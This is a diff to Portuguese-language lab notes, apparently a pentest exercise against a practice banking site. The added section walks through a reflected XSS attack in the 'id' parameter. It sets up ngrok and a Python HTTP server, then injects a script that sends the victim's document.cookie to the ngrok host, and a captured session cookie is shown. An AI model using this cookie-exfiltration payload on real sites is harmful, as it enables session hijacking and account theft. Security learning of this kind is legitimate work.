@@ -292,7 +292,45 @@ A partir das urls (abaixo), testei comando de JavaScript para verificar se o com
 http://www.bancocn.com/cat.php?id=%3Cscript%3Ealert(%22Hello%22)%3C/script%3E
 ```
 
-### SQL (MariaDB)
+#### Ngrok
+
+- [Snapcraft Instalção](https://snapcraft.io/ngrok)
+
+**Instalação**: `sudo snap install ngrok`
+
+**Ngrok Config Token**: `ngrok config add-authtoken <YOUR TOKEN>`
+
+Testando comandos na URL
+
+`www.bancocn.com/cat.php?id=<script>new Image(document.cookie)</script>`
+- **output [COOKIE]**: PHPSESSID=n1lv5k2veefokdcooaak68mic1
+
+Rodar um servidor `http` com Python e Ngrok
+
+```bash
+python -m http.server
+```
+
+Implementar o código no site.
+
+`http://www.bancocn.com/cat.php?id=<script src="<NGROK URL>/script.js"></script>`
+
+Ativando servidores
+
+```bash
+python -m http.server
+ngrok http <PYTHON SERVER PORT>
+```
+
+**/script.js**
+
+```js
+new Image().src = "<NGROK URL>/?" + document.cookie
+```
+
+----
+
+### SQL Injection
 
 Ao executar o comando acima, descobri também que o site apresentou o erro de sintaxe para erros de banco de dados, especificamente, para MariaDB.
 
